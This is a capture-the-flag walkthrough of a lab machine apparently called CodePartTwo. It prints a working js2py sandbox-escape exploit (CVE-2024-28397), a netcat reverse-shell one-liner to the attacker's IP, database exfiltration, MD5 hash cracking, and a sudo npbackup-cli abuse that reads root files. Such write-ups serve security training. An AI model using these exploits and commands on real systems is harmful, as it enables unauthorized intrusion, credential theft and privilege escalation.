# CodePartTwo - Easy

```sh
sudo vim /etc/hosts
# map IP to codeparttwo.htb

nmap -T4 -p- -A -Pn -v codeparttwo.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
    * 8000/tcp - http - Gunicorn 20.0.4

* checking the webpage on port 8000, we have a website for a coding software with login, register and download options

* the download option gives us the complete source code of the webapp in a zip file

* checking the app code, we get the cleartext password 'S3cr3tK3yC0d3PartTw0' in the 'app.py' file - this password is used to connect to the app DB

* the app also includes a file 'users.db' in the 'instance' folder - this could be likely the DB for the webapp, so we can check this further:

    ```sh
    sqlitebrowser instance/users.db
    ```

* the DB file does not include any data however

* we can register a test user on the webapp and log in, which leads to the dashboard view

* the webapp offers a JavaScript code editor, and we can save or run the code

* saving the code saves it in the webapp, and we can either load or delete it

* checking the app 'requirements.txt' file, it gives us 3 dependencies:

    * flask==3.0.3
    * flask-sqlalchemy==3.1.1
    * js2py==0.74

* Googling for exploits associated with any of these dependencies gives us a RCE exploit for webapps using js2py <= 0.74

* we get [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape) - a js2py RCE vuln used for sandbox escapes, and impacts js2py version 0.74

* we can refer the repository for the PoC JS snippet, and modify it slightly to test if the RCE works:

    ```sh
    # check on tun0 interface for ICMP packets
    sudo tcpdump -i tun0 icmp
    ```

    ```js
    let cmd = "ping -c 3 10.10.14.21;"
    let hacked, bymarve, n11
    let getattr, obj

    hacked = Object.getOwnPropertyNames({})
    bymarve = hacked.__getattribute__
    n11 = bymarve("__getattribute__")
    obj = n11("__class__").__base__
    getattr = obj.__getattribute__

    function findpopen(o) {
        let result;
        for(let i in o.__subclasses__()) {
            let item = o.__subclasses__()[i]
            if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
                return item
            }
            if(item.__name__ != "type" && (result = findpopen(item))) {
                return result
            }
        }
    }

    n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
    console.log(n11)
    n11
    ```

* testing the above JS snippet in the code interpreter, we do see ping packets hitting our interface, so it works

* we can setup a listener and modify the exploit to execute the command ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.21 4444 >/tmp/f```:

    ```sh
    nc -nvlp 4444

    # run the PoC after editing it to run the revshell one-liner

    # we get reverse shell

    id
    # user 'app'

    # upgrade shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # /home/app/app

    ls -la /home/app
    # we do not have user flag here

    ls -la /home
    # we have another user 'marco'

    ls -la /home/app/app
    # it is the same app structure as the one downloaded

    ls -la /home/app/app/instance
    # we have a .db file here as well, we can try checking it

    strings /home/app/app/instance/users.db
    # this mentions the name 'marco', along with a hash

    # we can transfer this to attacker

    cd /home/app/app/instance

    md5sum users.db
    # check MD5 hash

    cat users.db | base64 -w 0; echo
    # encode to base64
    ```

    ```sh
    # on attacker
    echo -n "<base64-encoded-text>" | base64 -d > users.db
    # decode to file

    md5sum users.db
    # verify the hashes match

    sqlitebrowser users.db
    ```

* this time, the DB contains username and password hash for 'marco' and 'app' users

* as checked in the source code, the hashes are MD5 hashes so we can crack them in ```hashcat```:

    ```sh
    vim hashes.txt
    # paste both hashes

    hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
    # cracks the password
    ```

* ```hashcat``` cracks marco's hash to cleartext 'sweetangelbabylove' - we can attempt to log into SSH:

    ```sh
    ssh marco@codeparttwo.htb
    # this works

    cat user.txt

    sudo -l
    # this shows we can run 'npbackup-cli'
    ```

* ```sudo -l``` shows that we can run the following as sudo:

    ```sh
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
    ```

* also we have a few related files in home directory:

    ```sh
    ls -la

    ls -la backups
    # permission denied

    cat npbackup.conf
    ```

* this config file is for ```npbackup```, it mentions the version 3.0.1, and also includes a few hashes for the repo URI and the repo password

* Googling for npbackup 3.0.1 does not lead to any exploits

* the hash format seems to be unrecognizable, so we can check the other things related to ```npbackup```:

    ```sh
    ls -la /usr/local/bin
    # includes npbackup and related utilities

    cat /usr/local/bin/npbackup-cli
    ```

    ```py
    #!/usr/bin/python3
    # -*- coding: utf-8 -*-
    import re
    import sys
    from npbackup.__main__ import main
    if __name__ == '__main__':
        # Block restricted flag
        if '--external-backend-binary' in sys.argv:
            print("Error: '--external-backend-binary' flag is restricted for use.")
            sys.exit(1)

        sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
        sys.exit(main())
    ```

* this Python script acts as a wrapper for ```npbackup``` and refuses to run if the user supplies the ```--external-backend-binary``` flag, and edits the executable name

* checking the other files:

    ```sh
    cat /usr/local/bin/npbackup-cli.cmd
    ```

    ```sh
    @echo off

    setlocal

    if exist "%~dp0..\python.exe" (
    "%~dp0..\python" -m npbackup %*
    ) else if exist "%~dp0python.exe" (
    "%~dp0python" -m npbackup %*
    ) else (
    "python" -m npbackup %*
    )

    endlocal
    ```

* the '.cmd' file is a Windows batch script and works in a similar way as the previous Python script, to launch ```npbackup```

* similarly, the program at ```/usr/local/bin/npbackup-gui``` launches the GUI app, and ```/usr/local/bin/npbackup-viewer``` launches the 'viewer' for the GUI app

* trying to run the binary, we can see it fails to run even if we run as 'sudo':

    ```sh
    /usr/local/bin/npbackup-cli

    sudo /usr/local/bin/npbackup-cli
    # 'cannot run without configuration file'
    ```

* we have a config file in home directory, we need a way to refer it

* checking the [official wiki for npbackup](https://github.com/netinvent/npbackup/wiki/Usage), we can see the required command to refer the configuration file, and we need to include an operation for that

* we can also get the help commands from the binary itself:

    ```sh
    /usr/local/bin/npbackup-cli --help
    ```

* from the help section, we have an option 'dump', which dumps a specific file to stdout - as we can run this binary as sudo, we can dump the flag directly:

    ```sh
    sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt -v
    # -v for verbose

    # this gives an error saying path '/root' not found in snapshot

    # list current snapshot
    sudo /usr/local/bin/npbackup-cli -c npbackup.conf --ls
    # this is only in '/home' directory

    sudo /usr/local/bin/npbackup-cli -c npbackup.conf -s
    # only one snapshot exists
    ```

* ```npbackup``` is not able to dump files from other directories because the config file mentions the path as ```/home/```, causing it to check this file only

* while we cannot edit/write this config file, we can take a copy of it to another directory like '/tmp', edit it to consider a path like '/root', and then take backups to read the root flag:

    ```sh
    cp npbackup.conf /tmp

    cd /tmp

    nano npbackup.conf
    # under the 'backup_opts' variables, edit 'paths' from '/home/' to '/root'

    # now we can take a fresh backup by referring to this new config file

    sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup

    sudo /usr/local/bin/npbackup-cli -c npbackup.conf -s
    # includes the newer snapshot

    sudo /usr/local/bin/npbackup-cli -c npbackup.conf --ls 20305631
    # list contents of newer snapshot
    # this includes root flag, so we can dump it

    sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt
    ```
